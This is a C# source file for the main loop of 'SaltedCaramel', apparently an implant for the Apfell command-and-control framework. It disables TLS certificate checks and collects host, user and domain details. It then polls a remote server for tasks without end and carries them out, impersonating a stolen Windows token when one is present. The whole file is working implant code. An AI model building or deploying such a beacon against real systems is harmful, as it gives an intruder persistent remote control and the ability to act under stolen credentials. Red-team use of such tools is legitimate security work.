using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;
using System.Threading;

namespace SaltedCaramel
{
    class SaltedCaramel
    {
        static void Main(string[] args)
        {
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback = 
                delegate { return true; };

            SaltedCaramelImplant implant = new SaltedCaramelImplant();
            // Generated when payload is created in Apfell
            implant.uuid = "2e60933e-e530-4bdc-b2a1-3410a9f2fc94";
            implant.endpoint = args[0] + "/api/v1.3/";
            implant.host = Dns.GetHostName();
            // Necessary because the host may have more than one interface
            implant.ip = Dns.GetHostEntry(implant.host)
                .AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork).ToString();
            implant.domain = System.Environment.UserDomainName;
            implant.os = System.Environment.OSVersion.VersionString;
            implant.architecture = "x64";
            using (Process proc = Process.GetCurrentProcess())
                implant.pid = proc.Id;
            implant.sleep = 5000;
            implant.user = Environment.UserName;

            implant.PSK = Convert.FromBase64String(args[1]);

            implant.InitializeImplant();

            while (true)
            {
                SaltedCaramelTask task = implant.CheckTasking();
                if (task.command != "none")
                {
                    if (implant.hasAlternateToken() == true)
                    {
                        using (WindowsIdentity ident = new WindowsIdentity(Token.stolenHandle))
                        using (WindowsImpersonationContext context = ident.Impersonate())
                        {
                            task.DispatchTask(implant);
                        }
                    }
                    else
                    {
                        ThreadPool.QueueUserWorkItem((i) => task.DispatchTask(implant));
                    }
                }
                Thread.Sleep(implant.sleep);
            }
        }
    }
}
